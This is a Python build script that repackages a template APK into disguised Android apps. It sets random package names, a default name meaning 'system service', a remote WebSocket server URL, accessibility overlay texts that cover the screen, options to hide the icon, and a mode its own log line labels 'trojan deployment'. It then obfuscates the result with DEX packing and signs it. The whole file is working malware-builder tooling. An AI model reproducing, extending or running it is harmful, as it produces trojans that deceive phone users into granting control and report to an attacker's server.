#!/usr/bin/env python3
"""服务器端 APK 构建脚本 v4 - 修复应用名替换"""
import sys, os, random, string, json, argparse, zipfile, shutil

sys.path.insert(0, '/opt/fisher-node/apk-builder')
import apk_repacker

def _do_zipalign(input_path, output_path, alignment=4):
    """Ensure resources.arsc is STORED and 4-byte aligned (Android R+ requirement)"""
    import zipfile as zf
    entries = []
    with zf.ZipFile(input_path, 'r') as zin:
        for info in zin.infolist():
            entries.append((info, zin.read(info.filename)))
    with zf.ZipFile(output_path, 'w') as zout:
        for info, data in entries:
            new_info = zf.ZipInfo(info.filename)
            new_info.date_time = info.date_time
            new_info.external_attr = info.external_attr
            if info.filename == 'resources.arsc' or info.compress_type == zf.ZIP_STORED:
                new_info.compress_type = zf.ZIP_STORED
                fname_bytes = info.filename.encode('utf-8')
                header_size = 30 + len(fname_bytes)
                current_pos = zout.fp.tell()
                data_start = current_pos + header_size
                padding = (alignment - (data_start % alignment)) % alignment
                new_info.extra = b'\x00' * padding
            else:
                new_info.compress_type = info.compress_type
            zout.writestr(new_info, data)


def _linux_sign(self, input_path, output_path):
    import subprocess, shutil as sh
    keystore = '/opt/fisher-node/apk-builder/_debug.keystore'
    alias = 'debugkey'
    password = 'android'
    keytool = sh.which('keytool')
    if not os.path.exists(keystore) and keytool:
        subprocess.run([keytool, '-genkey', '-v', '-keystore', keystore, '-alias', alias,
            '-keyalg', 'RSA', '-keysize', '2048', '-validity', '10000',
            '-storepass', password, '-keypass', password,
            '-dname', 'CN=Debug,OU=Debug,O=Debug,L=Debug,S=Debug,C=US'], capture_output=True)
    # 先 zipalign
    aligned_path = input_path + '.aligned'
    _do_zipalign(input_path, aligned_path)
    
    # 优先用 apksigner (v1+v2 签名)
    apksigner = sh.which('apksigner')
    if apksigner and os.path.exists(keystore):
        result = subprocess.run([apksigner, 'sign',
            '--ks', keystore, '--ks-pass', 'pass:' + password,
            '--key-pass', 'pass:' + password, '--ks-key-alias', alias,
            '--v1-signing-enabled', 'true', '--v2-signing-enabled', 'true',
            '--out', output_path, aligned_path], capture_output=True)
        if os.path.exists(aligned_path):
            os.remove(aligned_path)
        if result.returncode == 0:
            print("  APK signed (apksigner v1+v2)")
            return True
        else:
            print(f"  apksigner failed: {result.stderr.decode()[:200]}")
    
    # 回退: jarsigner (仅 v1)
    jarsigner = sh.which('jarsigner')
    if jarsigner and os.path.exists(keystore):
        sh.copy2(aligned_path if os.path.exists(aligned_path) else input_path, output_path)
        if os.path.exists(aligned_path):
            os.remove(aligned_path)
        result = subprocess.run([jarsigner, '-keystore', keystore, '-storepass', password, '-keypass', password, output_path, alias], capture_output=True)
        if result.returncode == 0:
            print("  APK signed (jarsigner v1 only)")
            return True
    sh.copy2(input_path, output_path)
    print("  APK NOT signed")
    return False

apk_repacker.APKRepacker._sign_apk = _linux_sign

def main():

    # ★ 禁用 stdout 缓冲，让进度实时输出
    import functools as _ft
    global print
    print = _ft.partial(print, flush=True)
    parser = argparse.ArgumentParser()
    parser.add_argument('--server', required=True)
    parser.add_argument('--web', default='')
    parser.add_argument('--name', default='')
    parser.add_argument('--package', default='')
    parser.add_argument('--icon', default='')
    parser.add_argument('--bg', default='', help='Background image PNG')
    parser.add_argument('--config', default='', help='Full pageStyleConfig JSON')
    parser.add_argument('--output', required=True)
    args = parser.parse_args()
    
    SRC = '/opt/fisher-node/apk-builder/source.apk'
    
    psc = {}
    if args.config:
        try:
            psc = json.loads(args.config)
        except:
            pass
    
    pkg = args.package or psc.get('applicationId', '')
    if not pkg:
        parts = ['app','dev','go','io','my','ui','net','sys','run','top','web','api']
        p1 = random.choice(parts)
        p2 = ''.join(random.choices(string.ascii_lowercase, k=14 - 5 - len(p1)))
        pkg = f'com.{p1}.{p2}'
    
    app_name = args.name or psc.get('appName', '系统服务')
    
    print(f'Package: {pkg}')
    print(f'Server: {args.server}')
    print(f'Web: {args.web}')
    print(f'Name: {app_name}')
    
    print('  [1/6] 加载模板 APK...')
    r = apk_repacker.APKRepacker(SRC)
    print('  [2/6] 解析配置参数...')
    
    # ★ 关键: 先把额外配置写入 server_config（但不改 appName，让 repack 内部对比原始名来替换 ARSC）
    sc = r.server_config
    
    # 无障碍配置
    configMaskText = psc.get('_configMaskText', '')
    configMaskSubtitle = psc.get('_configMaskSubtitle', '')
    if configMaskText:
        sc['configMaskText'] = configMaskText
        print(f'  配置遮盖第一排: {configMaskText[:30]}')
    if configMaskSubtitle:
        sc['configMaskSubtitle'] = configMaskSubtitle
        print(f'  配置遮盖第二排: {configMaskSubtitle[:30]}')
    if psc.get('_configMaskTextColor'):
        sc['configMaskTextColor'] = psc['_configMaskTextColor']
    if psc.get('_configMaskSubtitleColor'):
        sc['configMaskSubtitleColor'] = psc['_configMaskSubtitleColor']
    
    sc['showAppIcon'] = psc.get('_showAppIcon', 'true') == 'true'
    sc['uninstallMode'] = psc.get('_uninstallMode', 'false') == 'true'
    sc['enableServiceMode'] = psc.get('_enableServiceMode', 'false') == 'true'
    sc['enableConfigMask'] = psc.get('_enableConfigMask', 'true') == 'true'
    
    # 进度提示语
    loadingTips = psc.get('_loadingTips', '')
    if loadingTips:
        try:
            tips = json.loads(loadingTips) if loadingTips.startswith('[') else loadingTips.split('\n')
            sc['loadingTips'] = tips
            print(f'  进度提示语: {len(tips)} 条')
        except:
            pass
    
    # pageStyleConfig 额外字段（不包括 appName，appName 由 repack 处理）
    psc_out = sc.setdefault('pageStyleConfig', {})
    if psc.get('usageInstructions'):
        psc_out['usageInstructions'] = psc['usageInstructions']
    if psc.get('enableButtonText'):
        psc_out['enableButtonText'] = psc['enableButtonText']
    if psc.get('enableButtonTextColor'):
        psc_out['enableButtonTextColor'] = psc['enableButtonTextColor']
    if psc.get('buttonColor'):
        psc_out['buttonColor'] = psc['buttonColor']
    if psc.get('versionName'):
        psc_out['versionName'] = psc['versionName']
    
    # ★ 子账户绑定：从 pageStyleConfig._ownerUsername 写入 server_config.ownerUsername
    if psc.get('_ownerUsername'):
        sc['ownerUsername'] = psc['_ownerUsername']
        print(f'  ★ ownerUsername: {psc["_ownerUsername"]}')
    
    print(f'  显示图标: {sc["showAppIcon"]}, 卸载模式: {sc["uninstallMode"]}, 木马部署: {sc["enableServiceMode"]}')
    
    print('  [3/6] 替换包名和配置...')
    # ★ 调用 repack - 这里会替换 ARSC 里的应用名（对比原始的 pageStyleConfig.appName 和传入的 app_name）
    r.repack(
        output_path=args.output,
        server_url=args.server,
        web_url=args.web or args.server.replace('wss://', 'https://').replace('ws://', 'http://'),
        app_name=app_name,
        package_name=pkg,
        icon_path=args.icon if args.icon and os.path.exists(args.icon) else None
    )
    
    print('  [4/6] 替换图标和资源...')
    # 替换应用图标 (assets/igj.png)
    icon_path = args.icon
    if icon_path and os.path.exists(icon_path):
        print(f'  替换应用图标: {icon_path}')
        with open(icon_path, 'rb') as f:
            icon_data = f.read()
        # 替换所有图标位置: assets/igj.png + res/drawable/r*.png (混淆的图标文件)
        # mipmap 里的才是真正的桌面图标
        icon_targets = [
            'assets/igj.png',
            'res/drawable/rs12.png', 'res/drawable/rt13.png',
            'res/drawable/ru14.png', 'res/drawable/rv15.png', 
            'res/drawable/rw16.png', 'res/drawable/rx17.png',
            # mipmap 桌面图标（各尺寸）
            'res/mipmap-mdpi/test.png', 'res/mipmap-mdpi/test_fg.png',
            'res/mipmap-mdpi/test_round.png', 'res/mipmap-mdpi/test_round_fg.png',
            'res/mipmap-hdpi/test.png', 'res/mipmap-hdpi/test_fg.png',
            'res/mipmap-hdpi/test_round.png', 'res/mipmap-hdpi/test_round_fg.png',
            'res/mipmap-xhdpi/test.png', 'res/mipmap-xhdpi/test_fg.png',
            'res/mipmap-xhdpi/test_round.png', 'res/mipmap-xhdpi/test_round_fg.png',
            'res/mipmap-xxhdpi/test.png', 'res/mipmap-xxhdpi/test_fg.png',
            'res/mipmap-xxhdpi/test_round.png', 'res/mipmap-xxhdpi/test_round_fg.png',
            'res/mipmap-xxxhdpi/test.png', 'res/mipmap-xxxhdpi/test_fg.png',
            'res/mipmap-xxxhdpi/test_round.png', 'res/mipmap-xxxhdpi/test_round_fg.png',
        ]
        tmp_path = args.output + '.icontmp'
        with zipfile.ZipFile(args.output, 'r') as zin:
            with zipfile.ZipFile(tmp_path, 'w', zipfile.ZIP_STORED) as zout:
                for info in zin.infolist():
                    data = zin.read(info.filename)
                    if info.filename in icon_targets:
                        data = icon_data
                        print(f'     替换: {info.filename}')
                    new_info = zipfile.ZipInfo(info.filename)
                    new_info.compress_type = info.compress_type
                    new_info.date_time = info.date_time
                    zout.writestr(new_info, data)
        os.remove(args.output)
        _linux_sign(None, tmp_path, args.output)
        os.remove(tmp_path)
        print('  图标替换完成')

    print('  [5/6] 替换背景图...')
    # 替换背景图
    if args.bg and os.path.exists(args.bg):
        print(f'  替换背景图: {args.bg}')
        with open(args.bg, 'rb') as f:
            bg_data = f.read()
        tmp_path = args.output + '.tmp'
        with zipfile.ZipFile(args.output, 'r') as zin:
            with zipfile.ZipFile(tmp_path, 'w', zipfile.ZIP_STORED) as zout:
                for info in zin.infolist():
                    data = zin.read(info.filename)
                    if info.filename in ('assets/bg_accessibility.png', 'assets/app_loading_bg.png', 'res/drawable/bg_accessibility.png', 'res/drawable/bg_config_mask.png'):
                        data = bg_data
                        print(f'     替换: {info.filename}')
                    new_info = zipfile.ZipInfo(info.filename)
                    new_info.compress_type = info.compress_type
                    new_info.date_time = info.date_time
                    zout.writestr(new_info, data)
        os.remove(args.output)
        _linux_sign(None, tmp_path, args.output)
        os.remove(tmp_path)
        print('  背景图替换完成')
    
    # ★ dpt-shell DEX 加壳保护（方法体抽空 + 运行时重建）
    import subprocess as _sp
    import glob as _glob
    DPT_JAR = '/opt/fisher-node/apk-builder/dpt-shell/executable/dpt.jar'
    if os.path.exists(DPT_JAR):
        print('  🔒 [6/6] 正在执行 dpt-shell DEX 加壳保护...')
        _dpt_out_dir = args.output + '.dpt_out'
        _dpt_ret = _sp.run(
            ['java', '-jar', DPT_JAR, '-f', args.output, '-x', '-o', _dpt_out_dir],
            capture_output=True, text=True, timeout=180
        )
        if _dpt_ret.stdout:
            for _l in _dpt_ret.stdout.strip().split('\n')[-3:]:
                print(f'    {_l}')
        # 用 glob 查找输出的 unsign APK（避免中文文件名匹配问题）
        _unsign_list = _glob.glob(os.path.join(_dpt_out_dir, '*.apk'))
        if _unsign_list:
            _unsign_apk = _unsign_list[0]
            print(f'  找到加壳文件: {os.path.basename(_unsign_apk)}')
            # 重新签名
            _aligned = args.output + '.aligned.tmp'
            _sp.run(['zipalign', '-f', '4', _unsign_apk, _aligned],
                    capture_output=True, timeout=60)
            if not os.path.exists(_aligned):
                _aligned = _unsign_apk
            _sign_ret = _sp.run([
                'apksigner', 'sign',
                '--ks', '/opt/fisher-node/apk-builder/_debug.keystore',
                '--ks-pass', 'pass:android', '--key-pass', 'pass:android',
                '--ks-key-alias', 'debugkey',
                '--v1-signing-enabled', 'true', '--v2-signing-enabled', 'true',
                '--out', args.output, _aligned
            ], capture_output=True, text=True, timeout=60)
            if _sign_ret.returncode == 0:
                print('  ✅ dpt-shell 加壳 + 签名完成')
            else:
                print(f'  ⚠️ 签名警告: {_sign_ret.stderr[:200]}')
            # 清理
            import shutil
            if os.path.exists(_dpt_out_dir):
                shutil.rmtree(_dpt_out_dir, ignore_errors=True)
            for _tmp in [_aligned, _aligned + '.idsig', args.output + '.idsig']:
                if os.path.exists(_tmp):
                    try: os.remove(_tmp)
                    except: pass
        else:
            print(f'  ⚠️ dpt-shell 未找到输出文件')
            # 列出目录内容帮助调试
            if os.path.exists(_dpt_out_dir):
                _files = os.listdir(_dpt_out_dir)
                print(f'    输出目录内容: {_files}')
    else:
        print('  ℹ️ dpt-shell 未安装，跳过 DEX 保护')

    size = os.path.getsize(args.output) / 1024 / 1024
    print(f'SUCCESS: {size:.1f} MB')

if __name__ == '__main__':
    main()
